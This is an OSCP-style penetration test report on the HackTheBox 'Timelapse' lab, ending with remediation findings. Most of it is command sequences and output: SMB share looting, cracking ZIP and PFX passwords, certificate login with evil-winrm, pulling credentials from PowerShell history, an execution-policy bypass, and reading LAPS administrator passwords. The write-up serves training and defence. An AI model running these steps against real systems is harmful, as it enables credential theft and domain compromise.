# HTB Timelapse - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-20

---

## 1. Executive Summary

A penetration test was conducted against the target host “Timelapse” in the HackTheBox environment. Multiple vulnerabilities were identified, including anonymous SMB share access, exposed backup archives containing encrypted certificate material, credential disclosure within PowerShell history files, and insecure LAPS password exposure.

Initial access was achieved through extraction and cracking of a password-protected WinRM backup archive containing certificate-based authentication material. The recovered certificate and private key were used to authenticate over WinRM as the user `legacyy`.

Post-exploitation enumeration identified sensitive credentials stored within PowerShell command history files. The recovered credentials provided access to the `svc_deploy` account. BloodHound analysis revealed that the account possessed LAPS password read permissions.

Privilege escalation was achieved by retrieving the Local Administrator Password Solution (LAPS) password for the Domain Controller and authenticating as the local administrator. The assessment resulted in full compromise of the target system.

---

## 2. Scope

- **Target:** 10.129.227.113
- **Environment:** HackTheBox Timelapse
- **Testing Window:** 2026-5-20
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 10.129.227.113 -T4 -oA timelapse_tcp --open
```

Relevant Output:

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  https
9389/tcp  open  mc-nmf
```

Interpretation:

The target appeared to be a Windows Active Directory Domain Controller exposing LDAP, SMB, Kerberos, and WinRM services.

### RPC Enumeration

Command:

```
rpcclient -U "" -N 10.129.227.113
```

Relevant Output:

```
Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED
```

Interpretation:

Null session RPC enumeration was not permitted.

### SMB Enumeration

Command:

```
smbclient -L //10.129.227.113 -N
```

Relevant Output:

```
Sharename       Type
---------       ----
ADMIN$          Disk
C$              Disk
NETLOGON        Disk
Shares          Disk
SYSVOL          Disk
```

Interpretation:

Anonymous SMB enumeration was permitted and revealed the `Shares` share.

---

## 5. Enumeration

### Download SMB Share Contents

Command:

```
smbclient //10.129.227.113/Shares -N
```

Commands:

```
recurse ON

prompt OFF

mget *
```

Interpretation:

Multiple files were downloaded from the SMB share, including backup archives and documentation.

### LDAP Enumeration

Command:

```
ldapsearch -x -H ldap://10.129.227.113 -s base namingcontexts
```

Relevant Output:

```
namingcontexts: DC=timelapse,DC=htb
```

Command:

```
ldapsearch -x -H ldap://10.129.227.113 -b "DC=timelapse,DC=htb"
```

Relevant Output:

```
result: 1 Operations error
```

Interpretation:

LDAP enumeration confirmed the domain name `timelapse.htb`, however authenticated access was required for further enumeration.

### Backup Archive Discovery

A backup archive named `winrm_backup.zip` was identified in the SMB share contents.

Command:

```
7z x winrm_backup.zip
```

Relevant Output:

```
ERROR: Wrong password
```

Interpretation:

The archive was password protected and required offline cracking.

---

## 6. Initial Access

### Crack ZIP Password

Command:

```
zip2john winrm_backup.zip > hash.txt
```

Command:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Relevant Output:

```
supremelegacy
```

Interpretation:

The password protecting the ZIP archive was successfully recovered.

### Extract WinRM Backup Archive

Command:

```
7z x winrm_backup.zip -psupremelegacy
```

Relevant Output:

```
Everything is Ok
```

Interpretation:

The archive extraction revealed a password-protected PFX certificate file.

### Crack PFX Password

Command:

```
pfx2john legacyy_dev_auth.pfx > pfx.hash
```

Command:

```
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Relevant Output:

```
thuglegacy
```

Interpretation:

The password for the PFX certificate file was successfully recovered.

### Extract Certificate and Private Key

Command:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -password pass:thuglegacy -out private.key
```

Command:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -password pass:thuglegacy -out certificate.crt
```

Interpretation:

The certificate and private key were extracted for WinRM authentication.

### WinRM Access Using Certificate Authentication

Command:

```
evil-winrm -i timelapse.htb -S -k private.key -c certificate.crt
```

Relevant Output:

```
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

Verification Commands:

```
whoami

hostname

ipconfig
```

Relevant Output:

```
timelapse\legacyy
DC01
10.129.227.113
```

Interpretation:

Authenticated WinRM access was obtained as the user `legacyy`.

---

## 7. Post-Exploitation

### Basic Enumeration

Commands:

```
whoami /priv

whoami /groups
```

Interpretation:

The user possessed standard domain user privileges with no direct administrative access.

### PowerShell History Enumeration

Command:

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Relevant Output:

```
net use \\dc01\backup /user:svc_deploy
```

Credentials identified:

```
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
```

Interpretation:

Sensitive credentials were exposed within the PowerShell history file.

### Credential Validation

Command:

```
netexec winrm timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

Relevant Output:

```
[+] timelapse.htb\svc_deploy
```

Interpretation:

The recovered credentials were valid for WinRM authentication.

### BloodHound Enumeration

Command:

```
bloodhound-python -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -ns 10.129.227.113 -c All --zip
```

Relevant Output:

```
laps_readers@timelapse.htb - ReadLAPSPassword
```

Interpretation:

BloodHound identified that the `svc_deploy` account possessed LAPS password read permissions.

### WinRM Access as svc_deploy

Command:

```
evil-winrm -i timelapse.htb -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

Relevant Output:

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

Interpretation:

Interactive access was obtained as the `svc_deploy` account.

---

## 8. Privilege Escalation

### Upload PowerView

Commands:

```
cd C:\Windows\Tasks

upload /opt/tools/PowerView.ps1

powershell -ep bypass

. .\PowerView.ps1
```

Interpretation:

PowerView was imported to enumerate Active Directory permissions and LAPS data.

### Retrieve LAPS Password

Command:

```
Get-DomainComputer "dc01.timelapse.htb" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"
```

Relevant Output:

```
administrator : {1htWWz43l0,[Kng8dP/F8eK
```

Interpretation:

The LAPS password for the Domain Controller local administrator account was successfully retrieved.

### Administrator Access

Command:

```
evil-winrm -i timelapse.htb -S -u administrator -p '{1htWWz43l0,[Kng8dP/F8eK'
```

Verification Commands:

```
whoami

hostname

ipconfig
```

Relevant Output:

```
timelapse\administrator
DC01
10.129.227.113
```

Interpretation:

Privilege escalation to local administrator on the Domain Controller was successful.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\legacyy\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\TRX\Desktop\root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Anonymous SMB Share Access Exposing Sensitive Files

**Severity:** High

**Description:**
Anonymous SMB access allowed unauthenticated users to browse and download files from shared directories containing sensitive backup material.

**Impact:**
Attackers could obtain internal files, backup archives, and authentication material without valid credentials.

**Recommendation:**
Disable anonymous SMB access, restrict share permissions to authenticated users, and regularly audit shared directories for sensitive content.

### **Finding:** Weak Password Protection on Backup Archives

**Severity:** High

**Description:**
Sensitive backup archives and certificate files were protected using weak passwords vulnerable to dictionary attacks.

**Impact:**
Attackers could recover passwords through offline cracking techniques and extract authentication material for remote access.

**Recommendation:**
Use strong randomly generated passwords for backup archives and certificate exports, and avoid storing sensitive material on publicly accessible shares.

### **Finding:** Credential Disclosure in PowerShell History Files

**Severity:** Critical

**Description:**
Administrative credentials were exposed within PowerShell command history files accessible to low-privileged users.

**Impact:**
Attackers could recover valid credentials and move laterally within the environment.

**Recommendation:**
Avoid entering credentials directly into command-line interfaces, regularly clear PowerShell history files, and implement privileged access management controls.

### **Finding:** Excessive LAPS Read Permissions

**Severity:** Critical

**Description:**
The `svc_deploy` account possessed permissions allowing retrieval of LAPS-managed local administrator passwords.

**Impact:**
Attackers could retrieve administrative credentials and fully compromise domain systems.

**Recommendation:**
Restrict LAPS password read permissions to authorized administrators only and regularly audit Active Directory delegated permissions.

---

## 11. Appendix

Extracting SSL/TLS Certificates and Private Keys from PFX Files -
[https://medium.com/@fabmoda/extracting-ssl-tls-certificates-and-private-keys-from-a-pfx-file-for-apache-10ab20c31f27](https://medium.com/@fabmoda/extracting-ssl-tls-certificates-and-private-keys-from-a-pfx-file-for-apache-10ab20c31f27)

PowerShell History File Enumeration -
[https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)